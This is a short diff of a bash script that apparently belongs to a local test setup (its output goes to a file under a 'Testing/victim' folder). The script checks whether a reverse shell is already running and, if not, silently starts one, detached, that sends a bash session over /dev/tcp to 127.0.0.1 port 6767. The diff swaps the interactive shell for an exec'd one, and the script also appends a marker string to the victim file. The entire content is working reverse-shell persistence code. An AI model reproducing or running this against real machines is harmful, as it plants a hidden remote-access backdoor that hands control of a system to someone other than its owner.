@@ -1,6 +1,6 @@
 #!/usr/bin/env bash
 
-pgrep -af '/bin/bash -i.*127\.0\.0\.1/6767' >/dev/null || setsid /bin/bash -c '/bin/bash -i >& /dev/tcp/127.0.0.1/6767 0>&1' </dev/null >/dev/null 2>&1 &
+pgrep -af '/bin/bash -i.*127\.0\.0\.1/6767' >/dev/null || setsid /bin/bash -c 'exec /bin/bash >& /dev/tcp/127.0.0.1/6767 0>&1' </dev/null >/dev/null 2>&1 & 
 {
   echo "6767676766766776767 yibbi 66767676767676"
 } >> ~/Testing/victim/67.txt
